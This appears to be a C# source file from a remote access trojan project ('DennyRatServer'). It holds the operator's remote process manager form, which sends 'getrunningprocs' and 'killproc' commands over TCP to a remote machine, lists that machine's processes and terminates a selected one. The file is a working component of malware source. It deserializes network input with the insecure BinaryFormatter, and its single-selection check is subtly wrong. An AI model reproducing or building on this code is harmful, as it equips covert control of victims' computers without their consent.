using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DennyRatServer
{
    public partial class RemProcManager : Form
    {
        private TcpClient cli;
        private NetworkStream mainStream;
        private SortOrder currentSortOrder = SortOrder.Ascending;
        private bool sortingbyname = true;

        public RemProcManager(TcpClient ci)
        {
            cli = ci;
            InitializeComponent();
            listView1.ListViewItemSorter = new Sorter();
        }

        private void SendCommand(string command)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = cli.GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        private void RefreshListProcs()
        {
            listView1.Items.Clear();

            SendCommand("getrunningprocs");

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);
            string[] eachproc = stre.Split(new string[] { ":::" }, StringSplitOptions.RemoveEmptyEntries);

            foreach(string p in eachproc)
            {
                string[] procdetails = p.Split(new string[] { "::" }, StringSplitOptions.None);
                ListViewItem itm = new ListViewItem(procdetails[0]);
                itm.SubItems.Add(procdetails[1]);
                listView1.Items.Add(itm);
            }

            /*
            Sorter s = (Sorter)listView1.ListViewItemSorter;
            s.Column = (sortingbyname ? 0 : 1);

            if (currentSortOrder == SortOrder.Descending)
            {
                s.Order = System.Windows.Forms.SortOrder.Descending;
            }
            else
            {
                s.Order = System.Windows.Forms.SortOrder.Ascending;
            }

            listView1.Sort();*/
        }

        private void SizeLastColumn(ListView lv)
        {
            lv.Columns[lv.Columns.Count - 1].Width = -2;
        }

        private void RemProcManager_Load(object sender, EventArgs e)
        {
            listView1.Columns[0].Width = 300;
            SizeLastColumn(listView1);
            listView1.Columns[0].Width = listView1.Columns[0].Width - SystemInformation.VerticalScrollBarWidth;
            RefreshListProcs();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshListProcs();
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(listView1.SelectedItems.Count <= 0)
            {
                MessageBox.Show("Must Select a Process");
                return;
            }

            if (listView1.SelectedItems.Count < 1)
            {
                MessageBox.Show("Must Select only one Process");
                return;
            }

            SendCommand("killproc::" + listView1.SelectedItems[0].SubItems[1].Text);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);

            RefreshListProcs();
        }

        private void listView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if((sortingbyname == true && e.Column == 1) || (sortingbyname == false && e.Column == 0))
            {
                currentSortOrder = SortOrder.Ascending;
            }
            else
            {
                if (currentSortOrder == SortOrder.Ascending)
                {
                    currentSortOrder = SortOrder.Descending;
                }
                else
                {
                    currentSortOrder = SortOrder.Ascending;
                }
            }


            if (e.Column == 0)
            {
                sortingbyname = true;
            }
            else
            {
                sortingbyname = false;
            }

            Sorter s = (Sorter)listView1.ListViewItemSorter;
            s.Column = (sortingbyname ? 0 : 1);

            if (currentSortOrder == SortOrder.Descending)
            {
                s.Order = System.Windows.Forms.SortOrder.Descending;
            }
            else
            {
                s.Order = System.Windows.Forms.SortOrder.Ascending;
            }

            listView1.Sort();
        }
    }
}
